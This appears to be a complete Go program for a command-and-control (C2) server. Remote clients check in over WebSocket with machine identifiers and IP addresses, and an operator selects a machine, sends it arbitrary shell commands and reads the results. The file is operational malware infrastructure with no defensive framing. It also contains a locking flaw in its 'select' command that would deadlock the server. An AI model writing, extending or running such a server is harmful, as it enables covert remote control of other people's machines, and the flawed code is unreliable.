package main

import (
	"bufio"
	"encoding/base64"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"sort"
	"strings"
	"sync"
	"syscall"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
}

type ClientInfo struct {
	MachineID string
	IPv4      string
	IPv6      string
}

type Client struct {
	Conn *websocket.Conn
	Info ClientInfo
}

var (
	clients     = make(map[string]*Client) // UUID -> Client
	clientsLock sync.RWMutex
	currentUUID string
)

func parseSystemInfo(data string) ClientInfo {
	info := ClientInfo{}
	pairs := strings.Split(data, ";")
	
	for _, pair := range pairs {
		kv := strings.SplitN(pair, ":", 2)
		if len(kv) == 2 {
			switch kv[0] {
			case "MachineID":
				info.MachineID = kv[1]
			case "IPv4":
				info.IPv4 = kv[1]
			case "IPv6":
				info.IPv6 = kv[1]
			}
		}
	}
	return info
}

func printClientList() {
	fmt.Println("\n=== Online Clients ===")
	
	clientsLock.RLock()
	defer clientsLock.RUnlock()
	
	if len(clients) == 0 {
		fmt.Println("No clients connected")
		return
	}
	
	// 获取排序的UUID列表
	uuids := make([]string, 0, len(clients))
	for uuid := range clients {
		uuids = append(uuids, uuid)
	}
	sort.Strings(uuids)
	
	// 打印客户端列表
	for i, uuid := range uuids {
		client := clients[uuid]
		selected := " "
		if uuid == currentUUID {
			selected = "*"
		}
		fmt.Printf("%s %2d. %s (IPv4: %s, IPv6: %s)\n", 
			selected, i+1, uuid, client.Info.IPv4, client.Info.IPv6)
	}
}

func sendCommand(cmd string) {
	if cmd == "" {
		return
	}
	
	clientsLock.RLock()
	defer clientsLock.RUnlock()
	
	if currentUUID == "" {
		fmt.Println("No client selected")
		return
	}
	
	if client, ok := clients[currentUUID]; ok {
		err := client.Conn.WriteMessage(websocket.TextMessage, []byte(cmd))
		if err != nil {
			fmt.Printf("Failed to send command to %s: %v\n", currentUUID, err)
		} else {
			fmt.Printf("Command sent to %s\n", currentUUID)
		}
	} else {
		fmt.Println("Client not found")
	}
}

func main() {
	port := flag.String("p", "8080", "Server port")
	flag.Parse()

	// 启动WebSocket服务器
	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		conn, err := upgrader.Upgrade(w, r, nil)
		if err != nil {
			return
		}
		defer conn.Close()

		_, msg, err := conn.ReadMessage()
		if err != nil {
			return
		}

		decoded, err := base64.StdEncoding.DecodeString(string(msg))
		if err != nil {
			return
		}

		info := parseSystemInfo(string(decoded))
		uuid := info.MachineID
		
		clientsLock.Lock()
		clients[uuid] = &Client{
			Conn: conn,
			Info: info,
		}
		clientsLock.Unlock()
		
		printClientList()
		
		// 设置心跳响应
		conn.SetPingHandler(func(string) error {
			conn.WriteMessage(websocket.PongMessage, nil)
			return nil
		})

		// 清理客户端
		defer func() {
			clientsLock.Lock()
			delete(clients, uuid)
			clientsLock.Unlock()
			if currentUUID == uuid {
				currentUUID = ""
			}
			fmt.Printf("\nClient disconnected: %s\n", uuid)
			printClientList()
		}()

		// 读取命令响应
		for {
			_, message, err := conn.ReadMessage()
			if err != nil {
				break
			}
			
			fmt.Printf("\n=== Response from %s ===\n%s\n", uuid, string(message))
			printClientList()
			fmt.Print("> ")
		}
	})

	server := &http.Server{Addr: ":" + *port}
	go func() {
		log.Printf("WebSocket server started on port %s", *port)
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Fatal(err)
		}
	}()

	// 命令行界面
	go func() {
		scanner := bufio.NewScanner(os.Stdin)
		fmt.Println("C2 Server CLI - Type 'help' for commands")
		printClientList()
		fmt.Print("> ")
		
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			parts := strings.SplitN(line, " ", 2)
			cmd := strings.ToLower(parts[0])
			arg := ""
			if len(parts) > 1 {
				arg = parts[1]
			}
			
			switch cmd {
			case "help":
				fmt.Println("Commands:")
				fmt.Println("  list - Show online clients")
				fmt.Println("  select [index|uuid] - Select client")
				fmt.Println("  cmd [command] - Send command to selected client")
				fmt.Println("  quit - Exit server")
				
			case "list":
				printClientList()
				
			case "select":
				if arg == "" {
					fmt.Println("Usage: select [index|uuid]")
					break
				}
				
				clientsLock.RLock()
				defer clientsLock.RUnlock()
				
				// 尝试按索引选择
				var selectedUUID string
				uuids := make([]string, 0, len(clients))
				for uuid := range clients {
					uuids = append(uuids, uuid)
				}
				sort.Strings(uuids)
				
				for i, uuid := range uuids {
					if arg == fmt.Sprintf("%d", i+1) || arg == uuid {
						selectedUUID = uuid
						break
					}
				}
				
				if selectedUUID != "" {
					currentUUID = selectedUUID
					fmt.Printf("Selected client: %s\n", currentUUID)
				} else {
					fmt.Println("Client not found")
				}
				
			case "cmd":
				if currentUUID == "" {
					fmt.Println("No client selected")
					break
				}
				sendCommand(arg)
				
			case "quit", "exit":
				fmt.Println("Shutting down server...")
				server.Close()
				os.Exit(0)
				
			default:
				fmt.Println("Unknown command. Type 'help' for available commands")
			}
			
			fmt.Print("> ")
		}
	}()

	// 优雅关机
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	<-sig
	fmt.Println("\nShutting down server...")
	server.Close()
	os.Exit(0)
}
